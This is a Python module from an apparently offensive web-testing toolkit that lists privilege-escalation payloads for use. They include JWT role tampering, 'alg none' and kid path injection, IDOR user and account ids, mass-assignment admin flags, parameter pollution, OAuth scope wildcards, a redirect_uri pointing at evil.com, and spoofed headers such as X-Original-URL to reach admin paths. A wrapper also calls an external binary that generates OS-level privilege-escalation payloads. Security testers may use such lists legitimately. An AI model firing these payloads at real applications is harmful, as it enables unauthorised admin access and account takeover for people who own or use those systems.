"""
Privilege escalation payloads — JWT manipulation, IDOR, mass assignment, and role bypass.
Extended with Nim-backed OS privilege escalation generator (ONEINFINITY_NIM_PRIVESC=1).
"""
from __future__ import annotations

import logging
import os
from typing import Any

from oneinfinity.arsenal.context_matcher import Payload

log = logging.getLogger(__name__)

PRIVESC_PAYLOADS = [
    # ── JWT role manipulation ─────────────────────────────────────────────────
    Payload('{"role":"admin"}',
            vuln_type="privesc", complexity="simple",
            tags=["jwt","role-manipulation","mass-assignment"]),
    Payload('{"role":"administrator","is_admin":true}',
            vuln_type="privesc", complexity="simple",
            tags=["jwt","role-manipulation"]),
    Payload('{"role":"superuser","permissions":["*"]}',
            vuln_type="privesc", complexity="simple",
            tags=["jwt","role-manipulation"]),
    Payload('{"alg":"none"}',
            vuln_type="privesc", complexity="medium",
            tags=["jwt","alg-none","critical"]),
    Payload('{"alg":"HS256","kid":"../../dev/null"}',
            vuln_type="privesc", complexity="complex",
            tags=["jwt","kid-injection","critical"]),
    # ── IDOR parameter manipulation ────────────────────────────────────────────
    Payload("user_id=1",
            vuln_type="privesc", complexity="simple",
            tags=["idor","id-manipulation","admin-account"]),
    Payload("user_id=0",
            vuln_type="privesc", complexity="simple",
            tags=["idor","id-manipulation","zero-id"]),
    Payload("userId=1&userId=2",
            vuln_type="privesc", complexity="medium",
            tags=["idor","parameter-pollution"]),
    Payload("account_id=1",
            vuln_type="privesc", complexity="simple",
            tags=["idor","account-takeover"]),
    # ── Mass assignment ────────────────────────────────────────────────────────
    Payload('{"is_admin":true}',
            vuln_type="privesc", complexity="simple",
            tags=["mass-assignment","admin"]),
    Payload('{"admin":1,"role":"admin","is_superuser":true}',
            vuln_type="privesc", complexity="simple",
            tags=["mass-assignment","admin"]),
    Payload('{"_id":1,"__v":0,"admin":true}',
            vuln_type="privesc", complexity="simple",
            tags=["mass-assignment","mongodb"]),
    Payload('{"group_id":1,"org_id":1,"is_owner":true}',
            vuln_type="privesc", complexity="simple",
            tags=["mass-assignment","org-takeover"]),
    # ── Parameter pollution ────────────────────────────────────────────────────
    Payload("role=user&role=admin",
            vuln_type="privesc", complexity="simple",
            tags=["parameter-pollution","role-bypass"]),
    Payload("admin=false&admin=true",
            vuln_type="privesc", complexity="simple",
            tags=["parameter-pollution","boolean-bypass"]),
    # ── Path-based IDOR ───────────────────────────────────────────────────────
    Payload("/api/users/1/profile",
            vuln_type="privesc", complexity="simple",
            tags=["idor","path-manipulation"]),
    Payload("/api/admin/users",
            vuln_type="privesc", complexity="simple",
            tags=["idor","path-manipulation","admin"]),
    Payload("/api/users/me/../1",
            vuln_type="privesc", complexity="medium",
            tags=["idor","path-traversal","api"]),
    # ── OAuth/SSO scope escalation ─────────────────────────────────────────────
    Payload("scope=admin read write delete",
            vuln_type="privesc", complexity="medium",
            tags=["oauth","scope-escalation"]),
    Payload("scope=*",
            vuln_type="privesc", complexity="simple",
            tags=["oauth","scope-wildcard"]),
    Payload("redirect_uri=https://evil.com",
            vuln_type="privesc", complexity="simple",
            tags=["oauth","redirect-uri","open-redirect"]),
    # ── Header-based access bypass ────────────────────────────────────────────
    Payload("X-Original-URL: /admin",
            vuln_type="privesc", complexity="simple",
            tags=["header-injection","access-bypass"]),
    Payload("X-Rewrite-URL: /admin",
            vuln_type="privesc", complexity="simple",
            tags=["header-injection","access-bypass"]),
    Payload("X-Override-URL: /admin",
            vuln_type="privesc", complexity="simple",
            tags=["header-injection","access-bypass"]),
    Payload("X-Custom-IP-Authorization: 127.0.0.1",
            vuln_type="privesc", complexity="simple",
            tags=["header-injection","ip-auth-bypass"]),
    Payload("Authorization: Bearer null",
            vuln_type="privesc", complexity="simple",
            tags=["jwt","null-token"]),
]


def _nim_fast_path(
    os_name: str = "linux",
    technique: str = "sudo",
) -> list[dict[str, Any]] | None:
    """Return parsed NDJSON results from oi-privesc-gen, or None if unavailable."""
    if os.environ.get("ONEINFINITY_NIM_PRIVESC", "0") != "1":
        return None
    try:
        from oneinfinity.infra.nim_runner import run_nim_binary, NimIntegrityError, NimExecutionError
        results = run_nim_binary(
            "oi-privesc-gen",
            [f"--os={os_name}", f"--technique={technique}"],
        )
        # Filter to result events only; never log raw command strings
        return [r for r in results if r.get("event") == "result"]
    except Exception as exc:
        log.debug("oi-privesc-gen Nim fast-path unavailable: %s", type(exc).__name__)
        return None


def get_os_privesc_payloads(
    os_name: str = "linux",
    technique: str = "sudo",
) -> list[dict[str, Any]]:
    """Return OS-level privilege escalation payloads.

    Uses the compiled oi-privesc-gen Nim binary when ONEINFINITY_NIM_PRIVESC=1,
    falling back to an empty list (callers should use PRIVESC_PAYLOADS for
    web-layer privesc) when the binary is absent or the flag is unset.
    """
    nim_results = _nim_fast_path(os_name=os_name, technique=technique)
    if nim_results is not None:
        return nim_results
    return []
